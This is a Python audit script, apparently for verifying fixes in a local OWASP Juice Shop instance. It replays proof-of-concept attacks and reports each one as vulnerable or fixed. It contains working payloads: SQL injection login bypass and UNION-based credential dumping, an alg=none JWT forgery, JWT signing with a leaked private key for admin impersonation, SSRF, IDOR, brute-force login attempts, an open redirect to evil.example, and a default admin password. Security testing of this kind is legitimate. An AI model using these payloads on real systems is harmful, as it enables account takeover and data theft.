#!/usr/bin/env python3
"""Ручна валідація знахідок (аналог Burp Repeater): кожен тест відтворює PoC
і друкує ВРАЗЛИВО / ВИПРАВЛЕНО. Секрети (токени, хеші) у вивід не потрапляють.

Використання: python3 poc/manual_tests.py http://localhost:3000 [--json out.json]
"""
import base64, http.server, json, re, socketserver, sys, threading, time, uuid
import requests, urllib3

urllib3.disable_warnings()
BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:3000'
OUT = sys.argv[sys.argv.index('--json') + 1] if '--json' in sys.argv else None
S = requests.Session(); S.verify = False
results = []


def mask(s, keep=6):
    s = str(s)
    return s[:keep] + '…' if len(s) > keep else s


def report(tid, owasp, title, vulnerable, evidence):
    results.append({'id': tid, 'owasp': owasp, 'title': title,
                    'status': 'VULNERABLE' if vulnerable else 'FIXED', 'evidence': evidence})
    mark = '\033[31mВРАЗЛИВО  \033[0m' if vulnerable else '\033[32mВИПРАВЛЕНО\033[0m'
    print(f'[{tid}] {mark} {owasp:<9} {title}\n       ↳ {evidence}')


def register_and_login():
    email = f'audit_{uuid.uuid4().hex[:6]}@test.local'
    pw = 'Audit-Pass-2026!'
    S.post(f'{BASE}/api/Users', json={'email': email, 'password': pw, 'passwordRepeat': pw,
           'securityQuestion': {'id': 1}, 'securityAnswer': 'audit'})
    r = S.post(f'{BASE}/rest/user/login', json={'email': email, 'password': pw})
    a = r.json()['authentication']
    return {'email': email, 'token': a['token'], 'bid': a['bid']}


def H(u):
    return {'Authorization': f"Bearer {u['token']}"}


def main():
    print(f'Ціль: {BASE}   час: {time.strftime("%Y-%m-%d %H:%M:%S")}\n')
    A, B = register_and_login(), register_and_login()

    # F-01 SQLi у формі входу
    r = S.post(f'{BASE}/rest/user/login', json={'email': "' OR 1=1--", 'password': 'x'})
    ok = r.status_code == 200 and 'authentication' in r.text
    report('F-01', 'A05:2025', "SQL-ін'єкція у вході (email=' OR 1=1--)", ok,
           f"HTTP {r.status_code}; " + (f"увійшли як {r.json()['authentication']['umail']}" if ok else 'вхід відхилено'))

    # F-02 UNION SQLi у пошуку
    q = "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9','10' FROM Users--"
    r = S.get(f'{BASE}/rest/products/search', params={'q': q})
    emails = re.findall(r'"name":"([^"]+@[^"]+)"', r.text)
    report('F-02', 'A05:2025', 'UNION SQLi у /rest/products/search (витік облікових записів)', len(emails) > 0,
           f'HTTP {r.status_code}; отримано {len(emails)} e-mail та хешів паролів з таблиці Users')

    # F-03 Витік деталей помилки (стек/SQL)
    r = S.get(f'{BASE}/rest/products/search', params={'q': "test'))"})
    leak = 'SQLITE_ERROR' in r.text or 'at ' in r.text and '.js:' in r.text
    report('F-03', 'A10:2025', 'Витік деталей винятку (SQL/стек) у відповіді', leak,
           f"HTTP {r.status_code}; {'у тілі видно SQLITE_ERROR/стек' if leak else 'загальне повідомлення без деталей'}")

    # F-04 IDOR кошика
    r = S.get(f"{BASE}/rest/basket/{B['bid']}", headers=H(A))
    idor = r.status_code == 200 and r.json().get('data') and r.json()['data'].get('id') == B['bid']
    report('F-04', 'A01:2025', 'IDOR: користувач A читає кошик користувача B', bool(idor),
           f"GET /rest/basket/{B['bid']} з токеном A → HTTP {r.status_code}")

    # F-05 Перелік усіх користувачів звичайним покупцем
    r = S.get(f'{BASE}/api/Users', headers=H(A))
    n = len(r.json().get('data', [])) if r.status_code == 200 else 0
    report('F-05', 'A01:2025', 'Покупець отримує список усіх користувачів (/api/Users)', n > 1,
           f'HTTP {r.status_code}; записів: {n}')

    # F-06 JWT містить хеш пароля
    payload = json.loads(base64.urlsafe_b64decode(A['token'].split('.')[1] + '=='))
    pw = payload.get('data', {}).get('password', '')
    report('F-06', 'A04:2025', 'JWT містить хеш пароля (MD5) у payload', bool(pw),
           f"поле data.password {'присутнє (значення приховано), довжина ' + str(len(pw)) + ' hex = MD5' if pw else 'відсутнє'}")

    # F-07 Брутфорс входу без обмежень
    codes = [S.post(f'{BASE}/rest/user/login', json={'email': A['email'], 'password': f'wrong{i}'}).status_code
             for i in range(30)]
    report('F-07', 'A07:2025', 'Підбір пароля: 30 невдалих спроб поспіль', 429 not in codes,
           f"401: {codes.count(401)}, 429: {codes.count(429)}, інші: {len(codes) - codes.count(401) - codes.count(429)}")

    # F-08 Відкритий /ftp з конфіденційними файлами
    r1 = S.get(f'{BASE}/ftp/'); r2 = S.get(f'{BASE}/ftp/acquisitions.md')
    report('F-08', 'A02:2025', 'Лістинг /ftp та доступ до acquisitions.md', r1.status_code == 200 or r2.status_code == 200,
           f'/ftp → {r1.status_code}; /ftp/acquisitions.md → {r2.status_code}')

    # F-09 Службові ендпоінти: журнали, метрики, swagger, ключі
    paths = ['/support/logs', '/metrics', '/api-docs/', '/encryptionkeys']
    st = {p: S.get(BASE + p).status_code for p in paths}
    report('F-09', 'A02:2025', 'Публічні службові ендпоінти (логи, метрики, API-docs, ключі)',
           any(v == 200 for v in st.values()), ', '.join(f'{k}→{v}' for k, v in st.items()))

    # F-10 Заголовки безпеки та CORS
    h = S.get(BASE + '/').headers
    miss = [x for x in ['Content-Security-Policy', 'Strict-Transport-Security', 'Referrer-Policy'] if x not in h]
    cors = h.get('Access-Control-Allow-Origin')
    report('F-10', 'A02:2025', 'Відсутні заголовки безпеки / CORS *', bool(miss) or cors == '*',
           f"немає: {', '.join(miss) or '—'}; ACAO: {cors or '(не задано)'}; HTTPS: {BASE.startswith('https')}")

    # F-11 SSRF через завантаження аватара за URL
    hits = []

    class Hd(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path); self.send_response(200); self.end_headers(); self.wfile.write(b'x')

        def log_message(self, *a):
            pass
    socketserver.TCPServer.allow_reuse_address = True
    srv = socketserver.TCPServer(('127.0.0.1', 0), Hd); port = srv.server_address[1]; threading.Thread(target=srv.serve_forever, daemon=True).start()
    r = S.post(f'{BASE}/profile/image/url', data={'imageUrl': f'http://127.0.0.1:{port}/internal-admin'},
               cookies={'token': A['token']}, allow_redirects=False)
    time.sleep(1); srv.shutdown(); srv.server_close()
    report('F-11', 'A01:2025', 'SSRF: сервер звертається на внутрішню адресу 127.0.0.1', bool(hits),
           f'HTTP {r.status_code}; запитів до внутрішнього сервісу: {len(hits)} {hits[:1]}')

    # F-12 Від’ємна кількість товару (бізнес-логіка)
    r = S.post(f'{BASE}/api/BasketItems', headers=H(A), json={'ProductId': 1, 'BasketId': str(A['bid']), 'quantity': 1})
    item = r.json().get('data', {}).get('id') if r.status_code == 200 else None
    r2 = S.put(f'{BASE}/api/BasketItems/{item}', headers=H(A), json={'quantity': -100}) if item else None
    neg = r2 is not None and r2.status_code == 200
    report('F-12', 'A06:2025', 'Небезпечний дизайн: кількість товару = -100', neg,
           f"PUT /api/BasketItems/{item} quantity=-100 → HTTP {r2.status_code if r2 is not None else '—'}")

    # F-13 Непідписаний JWT (alg=none) приймається сервером
    b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
    forged = b64({'alg': 'none', 'typ': 'JWT'}) + '.' + b64({'data': {'id': 1, 'email': 'forged@evil.test', 'role': 'admin'}, 'iat': int(time.time())}) + '.'
    r = S.get(f'{BASE}/rest/user/authentication-details', headers={'Authorization': f'Bearer {forged}'})
    report('F-13', 'A08:2025', 'Підроблений JWT з alg=none приймається (обхід автентифікації)', r.status_code == 200,
           f'GET /rest/user/authentication-details з alg=none → HTTP {r.status_code}')

    # F-14 JWT, підписаний приватним ключем, що опублікований у вихідному коді Juice Shop
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        src = open('/home/ubuntu/sr1/tools_dl/juice-shop_20.4.0-SNAPSHOT/build/lib/insecurity.js').read()
        pem = re.search(r"const privateKey = '([^']+)'", src).group(1).replace('\\r\\n', '\n').encode()
        key = serialization.load_pem_private_key(pem, None)
        hp = b64({'alg': 'RS256', 'typ': 'JWT'}) + '.' + b64({'data': {'id': 1, 'email': 'forged@evil.test', 'role': 'admin'}, 'iat': int(time.time()), 'exp': int(time.time()) + 600})
        sig = base64.urlsafe_b64encode(key.sign(hp.encode(), padding.PKCS1v15(), hashes.SHA256())).rstrip(b'=').decode()
        r = S.get(f'{BASE}/rest/user/authentication-details', headers={'Authorization': f'Bearer {hp}.{sig}'})
        report('F-14', 'A04:2025', 'JWT, підписаний ключем із публічного коду (зашитий секрет)', r.status_code == 200,
               f'підписано ключем з insecurity.js → HTTP {r.status_code}')
    except Exception as e:  # noqa
        print('F-14 пропущено:', e)

    # F-16 Відкритий редирект (обхід allowlist через includes())
    r = S.get(f'{BASE}/redirect', params={'to': 'https://evil.example/?x=https://github.com/juice-shop/juice-shop'}, allow_redirects=False)
    loc = r.headers.get('Location', '')
    report('F-16', 'A01:2025', 'Відкритий редирект /redirect?to=… на сторонній домен', loc.startswith('https://evil.example'),
           f"HTTP {r.status_code}; Location: {loc[:40] or '—'}")

    # Функціональна регресія: легітимні сценарії мають працювати
    time.sleep(30)  # дати лімітеру входу відновитися (5 спроб/хв)
    # F-15 Стандартний слабкий пароль адміністратора
    r = S.post(f'{BASE}/rest/user/login', json={'email': 'admin@juice-sh.op', 'password': 'admin123'})
    report('F-15', 'A07:2025', 'Слабкий стандартний пароль адміністратора (admin123)', r.status_code == 200,
           f'вхід admin@juice-sh.op з паролем зі словника → HTTP {r.status_code}')
    ok1 = S.post(f'{BASE}/rest/user/login', json={'email': B['email'], 'password': 'Audit-Pass-2026!'}).status_code
    ok2 = S.get(f'{BASE}/rest/products/search', params={'q': 'apple'})
    ok3 = S.get(f"{BASE}/rest/basket/{A['bid']}", headers=H(A)).status_code
    n2 = len(ok2.json().get('data', [])) if ok2.status_code == 200 else 0
    print(f"\nРегресія (легітимні дії): вхід={ok1}, пошук 'apple'={ok2.status_code} ({n2} товарів), свій кошик={ok3}")
    v = sum(r['status'] == 'VULNERABLE' for r in results)
    print(f'ПІДСУМОК: вразливо {v} / виправлено {len(results) - v} із {len(results)}')
    if OUT:
        json.dump({'target': BASE, 'time': time.strftime('%Y-%m-%d %H:%M:%S'), 'results': results,
                   'regression': {'login': ok1, 'search': ok2.status_code, 'search_n': n2, 'own_basket': ok3}},
                  open(OUT, 'w'), ensure_ascii=False, indent=1)


if __name__ == '__main__':
    main()
